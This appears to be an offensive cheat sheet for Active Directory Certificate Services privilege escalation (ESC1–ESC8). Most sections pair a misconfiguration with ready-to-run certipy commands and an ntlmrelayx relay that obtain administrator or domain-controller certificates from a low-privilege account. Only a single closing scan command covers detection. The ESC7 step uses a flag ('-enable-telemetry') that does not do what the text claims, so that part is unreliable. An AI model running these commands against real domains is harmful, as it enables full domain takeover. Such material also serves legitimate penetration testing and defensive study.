# ADCS Attacks (ESC1–ESC8)

**MITRE:** T1649

Active Directory Certificate Services misconfigurations allow obtaining certificates that authenticate as any domain user, including Domain Admins.

## ESC1 — Enrollee supplies Subject Alternative Name

The template allows the enrollee to specify the SAN. Combined with an authentication EKU, any enrollee can request a certificate for `administrator@corp.local`.

```bash
certipy req -u jdoe@corp.local -p 'Pass' -ca 'CORP-CA' \
  -template 'VulnTemplate' -upn administrator@corp.local
certipy auth -pfx administrator.pfx -dc-ip 10.0.0.1
```

## ESC2 — Any Purpose EKU

Template has `Any Purpose` or no EKU restrictions — can be used for any authentication purpose.

## ESC3 — Enrollment Agent

Template has `Certificate Request Agent` EKU. Attacker obtains an agent certificate, then requests a certificate on behalf of any user.

```bash
# Step 1: get agent cert
certipy req -u jdoe@corp.local -p 'Pass' -ca 'CORP-CA' -template 'AgentTemplate'

# Step 2: request cert on behalf of admin
certipy req -u jdoe@corp.local -p 'Pass' -ca 'CORP-CA' \
  -template 'User' -on-behalf-of 'corp\administrator' \
  -pfx agent.pfx
```

## ESC4 — Template write access

Low-privilege principal has `WriteDACL`, `WriteOwner`, `GenericAll`, or `GenericWrite` on the template object. Attacker modifies the template to introduce ESC1.

```bash
certipy template -u jdoe@corp.local -p 'Pass' \
  -template 'VulnTemplate' -save-old

# Modify to add ENROLLEE_SUPPLIES_SUBJECT
certipy template -u jdoe@corp.local -p 'Pass' \
  -template 'VulnTemplate' -value msPKI-Certificate-Name-Flag=1
```

## ESC6 — EDITF_ATTRIBUTESUBJECTALTNAME2

The CA has this flag set — any template allows SAN regardless of template configuration.

```bash
certipy req -u jdoe@corp.local -p 'Pass' -ca 'CORP-CA' \
  -template 'User' -upn administrator@corp.local
```

## ESC7 — ManageCA / ManageCertificates

Low-privilege has officer rights on the CA object. ManageCA allows enabling ESC6. ManageCertificates allows approving pending requests.

```bash
# Enable EDITF flag (ManageCA)
certipy ca -u jdoe@corp.local -p 'Pass' -ca 'CORP-CA' \
  -enable-telemetry

# Issue a pending request (ManageCertificates)
certipy ca -u jdoe@corp.local -p 'Pass' -ca 'CORP-CA' \
  -issue-request 42
```

## ESC8 — Web Enrollment

AD CS has NTLM-authenticating HTTP endpoint. Can be abused via NTLM relay to obtain a DC certificate.

```bash
ntlmrelayx.py -t http://ca.corp.local/certsrv/certfnsh.asp \
  --adcs --template 'DomainController'
```

## Detection with adpath

```bash
adpath adcs -d corp.local -u jdoe -p 'Password1' --dc 10.0.0.1
```
